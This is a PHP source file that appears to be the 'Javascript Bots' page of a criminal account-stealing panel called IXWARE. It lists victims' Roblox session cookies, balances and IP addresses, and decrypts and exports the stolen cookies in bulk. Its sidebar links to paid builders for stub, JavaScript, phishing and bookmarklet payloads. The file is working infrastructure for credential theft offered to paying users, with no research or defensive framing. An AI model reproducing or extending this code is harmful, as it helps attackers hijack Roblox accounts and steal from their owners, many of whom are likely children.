<?php 
      @session_start();
      $title = 'Javascript Bots';
      include_once 'includes/layout/header.php';
      include_once 'includes/checks.php';

      $getRank = pdoQuery($db, "SELECT `rank` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
      $activated = pdoQuery($db, "SELECT `expireActivate` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
      $discordID = pdoQuery($db, "SELECT `discordID` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
      $banned = pdoQuery($db, "SELECT `banned` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn(0);

      if($banned != 0){
          
          header("location: support");
          exit();
      }
      if($activated != 0){
        header('Location: dashboard?activate');
        die();
      }
      if($discordID == 0){
        header('Location: settings.php?id');
        die();
      }
       
      if (!empty($_POST['removeBot'])){
            $id = htmlspecialchars($_POST["robloxCookie"]);

            if (checkCookie($id) != 0){
                $PDORemove = $db -> prepare('DELETE FROM `cookie_logs` WHERE `cookieID` = :cookieID');
                $PDORemove -> execute(array(':cookieID' => $id));

                $success = "Successfully removed bot!";
            }else{
                $error = "Unauthorized";
            }
      }
      if (isset($_POST['clearJS'])){

        if (!empty($_POST['clearJS'])){
    
            if (\Volnix\CSRF\CSRF::validate($_POST)) {
    
              if(checkCookieID(htmlspecialchars($_SESSION['ID'])) != 0){
    
                $get = pdoQuery($db, "SELECT * FROM `cookie_logs` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])]);
                $results = $get->fetchAll(PDO::FETCH_ASSOC);
                $row = $get->rowCount();
            
                foreach($results as $result){
                    $userID = htmlspecialchars($result['id']);
            
                    $PDODelete = $db -> prepare('DELETE FROM `cookie_logs` WHERE `id` = :id');
                    $PDODelete -> execute(array(':id' => $userID));  
                }
                $success = "Successfully removed all javascript bots";
            }else{
                $error = "No javascript bots found";
            }
          }else{
            header("HTTP/1.1 401 Unauthorized");
            echo file_get_contents('includes/layout/error/401.php');
            die();
          }
        }
      }
      if (isset($_POST['downloadJS'])){

        if (!empty($_POST['downloadJS'])){
    
            if (\Volnix\CSRF\CSRF::validate($_POST)) {
    
              if(checkCookieID(htmlspecialchars($_SESSION['ID'])) != 0){
    
                $get = pdoQuery($db, "SELECT * FROM `cookie_logs` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])]);
                $results = $get->fetchAll(PDO::FETCH_ASSOC);
                $row = $get->rowCount();
            
                $id = getID(25);
                foreach($results as $result){
                  $cookie = htmlspecialchars(decrypt($result['cookie'])) . "\r\n";
                  $file = 'resources/savedCookies/' . "IX_LOG_$id.txt";
                  file_put_contents($file, $cookie.PHP_EOL , FILE_APPEND | LOCK_EX);
                }
                $collected = file_get_contents($file);
                echo "<div class='modal fade' id='showPW' tabdashboard='-1' role='dialog' aria-labelledby='myModalLabel'
                aria-hidden='true'>
                <!-- Change class .modal-sm to change the size of the modal -->
                <div class='modal-dialog modal-lg' role='document'>
                  <div class='modal-content'>
                    <div class='modal-header bg-dark text-darkwhite'>
                      <h5 class='modal-title w-100' id='myModalLabel'>Collected Cookies</h5>
                      <button type='button' class='close text-white' data-dismiss='modal' aria-label='Close' id='modalButton'>
                        <span aria-hidden='true'>&times;</span>
                      </button>
                    </div>
                    <div class='modal-body bg-dark text-darkwhite text-break'>
                    <div class='form-outline'>
                    <textarea class='form-control text-darkwhite' id='textAreaExample' rows='4' style='margin-top: 0px; margin-bottom: 0px; height: 750px;'>$collected</textarea>
                    </div>
                    </div>
                  </div>
                </div>
              </div>";
              unlink($file);
            }else{
              $error = "No javascript bots found";
            }
          }else{
            header("HTTP/1.1 401 Unauthorized");
            echo file_get_contents('includes/layout/error/401.php');
            die();
          }
        }
      }
      if(isset($_SESSION['username'])){
        $username = htmlspecialchars($_SESSION['username']);
      }else{
        $username = "Unknown";
      }
?>

  <body class="bg-dark">
  <!--Main Navigation-->
  <header>
    <!-- Sidenav -->
    <nav id="sidenav-1" class="sidenav bg-dark" data-hidden="false" data-accordion="true">
      <a class="ripple d-flex justify-content-center py-4" href="#!" data-ripple-color="primary">
        <img id="IXWARE Logo" src="resources/img/ixwarelogogif.gif" alt="IX Logo" draggable="false" class="same-size-logo" />
      </a>

      <ul class="sidenav-menu">
        <li class="sidenav-item ml-4 mt-2 mb-1 text-white">
          <span>General</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="dashboard">
            <i class="fas fa-tachometer-slow fa-fw mr-3"></i><span>Dashboard</span>
          </a>
        </li>
        <?php
          if ($getRank == "User" || $getRank == "Admin"){
            echo "<li class='sidenav-item'>
            <a class='sidenav-link' href='purchase'>
              <i class='fas fa-shopping-basket fa-fw mr-3'></i><span>Purchase</span>
            </a>
          </li>";
          }
        ?>
        <li class="sidenav-item ml-4 mt-4 mb-1 text-white">
          <span>Managing</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-users fa-fw mr-3"></i><span>Bots</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){
                
                echo "<li class='sidenav-item'>
                 <a class='sidenav-link' href='bots'>Stubs <span class='badge bg-danger ml-2' id='bot-logs'>0</span></a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link active' href='jsBots'>Javascript <span class='badge bg-danger ml-2' id='cookie-logs'>0</span></a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='psBots'>Phishing <span class='badge bg-danger ml-2' id='ps-logs'>0</span></a>
                </li>";
              }elseif($getRank == "User"){

                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBots'>Javascript <span class='badge bg-danger ml-2' id='cookie-logs'>0</span></a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-shield-virus fa-fw mr-3"></i><span>Builder</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){
                
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='builder'>Stub</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilder'>Javascript</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='psBuilder'>Phishing</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='bmBuilder'>Bookmark</a>
                </li>";
              }elseif($getRank == "User"){
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilder'>Javascript</a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-file-download fa-fw mr-3"></i><span>Builds</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){
                
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='builds'>Stub</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilds'>Javascript</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='psBuilds'>Phishing</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='bmBuilds'>Bookmark</a>
                </li>";
              }elseif($getRank == "User"){
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilds'>Javascript</a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-tools fa-fw mr-3"></i><span>Tools</span>
          </a>
          <ul class="sidenav-collapse">
            <li class='sidenav-item'>
              <a class='sidenav-link' href='watchlist'>Watchlist</a>
            </li>
          </ul>
        </li>
        <li class="sidenav-item ml-4 mt-4 mb-1 text-white">
          <span>Account</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-sliders-h fa-fw mr-3"></i><span>Settings</span>
          </a>
          <ul class="sidenav-collapse">
            <li class="sidenav-item">
              <a class="sidenav-link" href="settings">General</a>
            </li>
            <li class="sidenav-item">
              <a class="sidenav-link" href="builder-settings">Builder</a>
             </li>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="ix-licenses">
            <i class="fab fa-keycdn fa-fw mr-3"#></i><span>Licenses</span>
          </a>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="support">
            <i class="fas fa-question-circle fa-fw mr-3"#></i><span>Support</span>
          </a>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="logout">
            <i class="fal fa-sign-out fa-fw mr-3"></i><span>Logout</span>
          </a>
        </li>
      </ul>
    </nav>
    <!-- Sidenav -->

    <!-- Navbar -->
    <nav
      id="main-navbar"
      class="navbar navbar-expand-lg navbar-light fixed-top bg-dark"
    >
      <!-- Container wrapper -->
      <div class="container-fluid">
        <nav aria-label="breadcrumb">
          <ol class="breadcrumb">
            <li class="breadcrumb-item text-white">Javascript Bots</li>
          </ol>
        </nav>
        <!-- Toggler -->
        <button
          data-toggle="sidenav"
          data-target="#sidenav-1"
          class="btn shadow-0 p-0 mr-3 d-block d-xxl-none"
          aria-controls="#sidenav-1"
          aria-haspopup="true"
        >
          <i class="fas fa-bars fa-lg"></i>
        </button>

        <!-- Right links -->
        <ul class="navbar-nav ml-auto d-flex flex-row">

          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0 mt-2 text-white">
              <?= $username ?>
            </a>
          </li>
          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0 mt-2">
              <?php
                if ($getRank == "User"){
                  echo "<span class='badge bg-light text-dark'>Default</span>";
                }elseif ($getRank == "Admin"){
                  echo "<span class='badge bg-danger'>Administrator</span>";
                }elseif ($getRank == "Premium"){
                  echo "<span class='badge bg-warning text-dark'>Premium</span>";
                }
              ?>
            </a>
          </li>
          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0">
<?php
		            $getAvatar = pdoQuery($db, "SELECT `avatarURL` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
                $av = htmlspecialchars($getAvatar);
                if ($av == '0' || empty($av)){
                  echo "<img src='resources/img/logo.png' class='img-fluid rounded-circle profile-size' alt='' />";
                }else{
                  echo "<img src='$av' class='img-fluid rounded-circle profile-size' alt='' />";
                }
              ?>
            </a>
          </li>
        </ul>
      </div>
      <!-- Container wrapper -->
    </nav>
    <!-- Navbar -->
  </header>
  <!--Main Navigation-->


  <!--Main layout-->
  <main style="margin-top: 100px" class="d-flex ml-5 mr-5">
    <div class="container-fluid">
        <div class="row">
          <div class="col-xl-8">
            <?php
              if(!empty($error)){
                  echo '<div class="animated fadeIn ml-3">'.error(htmlspecialchars($error)).'</div>';
              }
              if(!empty($success)){
                  echo '<div class="animated fadeIn ml-3">'.success(htmlspecialchars($success)).'</div>';
              }
            ?>
          </div>
        </div>
        <div class="row">
            <div class="col-xl-12">
                <div class="card bg-dark table" style="display:table;">
                  <div class="card-body d-flex flex-column">
                          <div style="display: inline-block;">
                            <form method="POST">
                              <button type="submit" title="Clear all logs" name="clearJS" value="js" style="border: none; outline: none; background: none; cursor: pointer; color: #fff; text-decoration: underline; font-family: inherit; font-size: inherit;"><i class='fas fa-trash-alt fa-lg text-white float-left'></i></button>
                              <button type="submit" name="downloadJS" value="js" style="border: none; outline: none; background: none; cursor: pointer; color: #fff; text-decoration: underline; font-family: inherit; font-size: inherit;"><i class='fas fa-save fa-lg text-white float-left'></i></button>
                              <input type="hidden" name="<?= \Volnix\CSRF\CSRF::TOKEN_NAME ?>" value="<?= \Volnix\CSRF\CSRF::getToken() ?>"/>
                            </form> 
                          </div>                          
                          <?php
                            echo "<div class='table-responsive'>";
                              echo "<table id='table-dataTable-js' class='table table-hover text-darkwhite'>";
                                  echo "<thead class='text-nowrap'>
                                  <tr>
                                    <th scope='col' class='font-weight-bolder'>Roblox Avatar</th>
                                    <th scope='col' class='font-weight-bolder'>Roblox UserName</th>
                                    <th scope='col' class='font-weight-bolder'>Robux</th>
                                    <th scope='col' class='font-weight-bolder'>Premium</th>
                                    <th scope='col' class='font-weight-bolder'>RAP</th>  
                                    <th scope='col' class='font-weight-bolder'>IP</th> 
                                    <th scope='col' class='font-weight-bolder'>Log Date</th>    
                                    <th scope='col' class='font-weight-bolder'>Actions</th>
                                  </tr>
                                  </thead>
                                  <tbody>";
                              echo "</tbody></table>";
                          ?>
                  </div>
                </div>
            </div>
            <?php 
                $usedToken = pdoQuery($db, "SELECT `usedToken` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
                $usedID = pdoQuery($db, "SELECT `id` FROM `users` WHERE `username`=?", [htmlspecialchars($usedToken)])->fetchColumn();
                          
                if(!empty($usedToken) && $usedToken != '0'){
                  echo "<div class='card bg-dark table' style='display: table;'>";
                    echo "<div class='card-body d-flex flex-column'>";
                            echo "<div class='table-responsive'>";
                                echo "<table id='table-dataTable-js-Shared' class='table table-hover text-darkwhite'>";
                                    echo "<thead class='text-nowrap'>
                                    <tr>
                                      <th scope='col' class='font-weight-bolder'>Roblox Avatar</th>
                                      <th scope='col' class='font-weight-bolder'>Roblox UserName</th>
                                      <th scope='col' class='font-weight-bolder'>Robux</th>
                                      <th scope='col' class='font-weight-bolder'>Premium</th>
                                      <th scope='col' class='font-weight-bolder'>RAP</th>  
                                      <th scope='col' class='font-weight-bolder'>IP</th> 
                                      <th scope='col' class='font-weight-bolder'>Log Date</th>    
                                      <th scope='col' class='font-weight-bolder'>Actions</th>
                                    </tr>
                                    </thead>
                                    <tbody>";
                                  echo "</tbody></table>";
                          echo "</div>";
                      echo "</div>";
                  echo "</div>";
                }
                ?>
        </div>
    </div>
  </main>
  <!--Main layout-->

<!-- Central Modal Small -->
<div class="modal fade" id="view-modal" tabdashboard="-1" role="dialog" aria-labelledby="myModalLabel"
  aria-hidden="true">

  <!-- Change class .modal-sm to change the size of the modal -->
  <div class="modal-dialog modal-lg" role="document">


    <div class="modal-content">
      <div class="modal-header bg-dark text-darkwhite">
        <h5 class="modal-title w-100" id="myModalLabel"><i class='fas fa-cookie-bite mr-2'></i>Log Info</h5>
        <button type="button" class="close text-white" data-dismiss="modal" aria-label="Close" id="modalButton">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body bg-dark text-darkwhite text-break">
        <div id="modal-loader" style="display: none; text-align: center;"></div>
                            
           <!-- mysql data will be load here -->                          
           <div id="dynamic-content"></div>
      </div>
    </div>
  </div>
</div>
<!-- Central Modal Small -->

  <?php require_once 'includes/layout/footer.php'; require_once 'includes/realtime.php';?>